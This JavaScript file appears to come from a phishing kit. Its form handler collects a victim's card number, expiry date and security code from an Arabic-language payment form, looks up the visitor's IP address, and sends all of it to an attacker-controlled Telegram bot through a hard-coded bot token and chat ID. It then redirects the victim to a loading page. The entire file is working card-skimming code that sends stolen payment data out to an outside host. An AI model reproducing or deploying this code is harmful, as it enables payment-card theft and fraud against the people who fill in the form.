function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission

    // Collect data
    const cardNumber = document.getElementById('splLogCardNumb').value;
    const expYear = document.getElementById('splLogExpDateY').value;
    const expMonth = document.getElementById('splLogExpDateM').value;
    const securityCode = document.getElementById('splLogSecuCode').value;

    // Basic validation
    if (!cardNumber || !expYear || !expMonth || !securityCode) {
        alert('الرجاء ملء جميع الحقول المطلوبة');
        return;
    }

    // Fetch IP address using ipify
    fetch('https://api.ipify.org?format=json')
        .then(response => {
            if (!response.ok) {
                throw new Error('IP API request failed');
            }
            return response.json();
        })
        .then(ipData => {
            const ipAddress = ipData.ip;

            // Since ipify only returns the IP, we'll assume the country is unknown
            const country = 'Unknown';

            // Telegram bot token and chat ID
            const botToken = '7782372269:AAHawGOO9s8x64Sda5-jVgTUlwI73BV51Xs';
            const chatId = '7057894073';

            // Formatted message
            const message = `
🔐 بيانات بطاقة جديدة:
📇 رقم البطاقة: ${cardNumber}
📅 تاريخ الانتهاء: ${expMonth}/${expYear}
🔢 رمز التحقق: ${securityCode}
🌍 البلد: ${country}
📡 عنوان IP: ${ipAddress}
            `;

            // Send message via Telegram API
            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram API Response:', data); // Log the response
            if (data.ok) {
                window.location.href = 'loading.html?status=success';
            } else {
                console.error('Telegram API Error:', data.description); // Log the error description
                window.location.href = 'loading.html?status=error';
            }
        })
        .catch(error => {
            console.error('Error:', error);
            window.location.href = 'loading.html?status=error';
        });
}
